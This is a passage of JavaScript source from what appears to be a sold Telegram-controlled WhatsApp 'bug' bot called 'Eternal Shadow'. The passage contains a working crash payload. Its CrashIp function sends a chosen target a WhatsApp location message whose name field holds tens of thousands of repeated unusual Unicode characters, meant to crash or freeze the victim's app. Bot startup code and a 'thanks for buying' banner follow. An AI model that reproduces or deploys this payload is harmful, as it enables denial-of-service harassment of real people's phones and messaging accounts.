    console.error(chalk.red(`Error..: ${error}`));
  }
}

async function CrashIp(target) {
    try {
        await sock.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://Wa.me/stickerpack/Yukina`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

// --- Jalankan Bot ---
async function initializeBot() {
  await validateToken();

  console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂⢕
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ Eternal Shadow
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ Created By Kaii
┃ THANKS FOR BUYYING MY SCRIPT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`));

  console.log(chalk.yellow("Connecting to WhatsApp..."));
  await initializeWhatsAppConnections();

  console.log(chalk.green("WhatsApp connected successfully!"));

  await bot.launch();
  console.log(chalk.green("Telegram bot is running..."));
}

initializeBot().catch(err => {
  console.error("Error during bot initialization:", err);
});

// Handle shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));